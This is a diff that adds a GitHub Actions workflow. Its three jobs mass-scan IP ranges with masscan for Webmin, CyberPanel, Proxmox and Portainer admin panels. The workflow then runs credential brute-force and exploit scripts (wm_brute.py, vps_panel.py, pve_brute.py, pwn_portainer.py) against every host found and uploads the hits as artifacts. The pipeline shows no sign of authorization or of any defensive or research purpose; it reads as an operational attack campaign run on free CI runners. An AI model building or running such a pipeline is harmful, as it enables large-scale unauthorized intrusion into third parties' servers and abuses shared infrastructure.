@@ -1,0 +1,79 @@
+name: big
+on: workflow_dispatch
+jobs:
+  webmin:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
+      - name: scan 10000
+        run: |
+          sudo masscan -iL cidrs_big.txt -p10000 --rate 100000 -oL w.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' w.txt | sort -u > webmin_big.txt
+          echo "=== webmin hosts: $(wc -l < webmin_big.txt) ==="
+      - name: credential sweep
+        run: python3 wm_brute.py webmin_big.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with: {name: big-webmin, path: "/tmp/wm_brute_hits.json", if-no-files-found: warn}
+  cyber:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
+      - name: scan 8090
+        run: |
+          sudo masscan -iL cidrs_big.txt -p8090 --rate 100000 -oL c.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' c.txt | sort -u > cp_big.txt
+          echo "=== cyberpanel hosts: $(wc -l < cp_big.txt) ==="
+      - name: exploit + verify
+        run: |
+          python3 vps_panel.py cp_big.txt || true
+          grep -o '"host": "[^"]*"' /tmp/vps_panel_hits.jsonl 2>/dev/null | cut -d'"' -f4 > cp_proven.txt || true
+          echo "proven candidates: $(wc -l < cp_proven.txt 2>/dev/null || echo 0)"
+          python3 cp_verify.py cp_proven.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: big-cyber
+          path: |
+            /tmp/vps_panel_result.json
+            /tmp/vps_panel_hits.jsonl
+            cp_big.txt
+          if-no-files-found: warn
+  pve:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          sudo apt-get update -qq && sudo apt-get install -y -qq masscan && pip install -q requests
+      - name: scan proxmox/portainer
+        run: |
+          sudo masscan -iL cidrs_big.txt -p8006,9000,9443 --rate 100000 -oL p.txt --wait 0 || true
+          awk '$1=="open"{print $4":"$3}' p.txt | sort -u > pve_big.txt
+          echo "=== pve/portainer hosts: $(wc -l < pve_big.txt) ==="
+          awk -F: '{print $2}' pve_big.txt | sort | uniq -c
+      - name: proxmox creds
+        run: |
+          grep -E ':8006$' pve_big.txt > pve_only.txt || true
+          echo "proxmox: $(wc -l < pve_only.txt)"
+          python3 pve_brute.py pve_only.txt || true
+      - name: portainer
+        run: |
+          grep -E ':(9000|9443)$' pve_big.txt > pt_big.txt || true
+          echo "portainer: $(wc -l < pt_big.txt)"
+          python3 pwn_portainer.py pt_big.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: big-pve
+          path: |
+            /tmp/pve_result.json
+            /tmp/portainer_result.json
+            pve_big.txt
+          if-no-files-found: warn
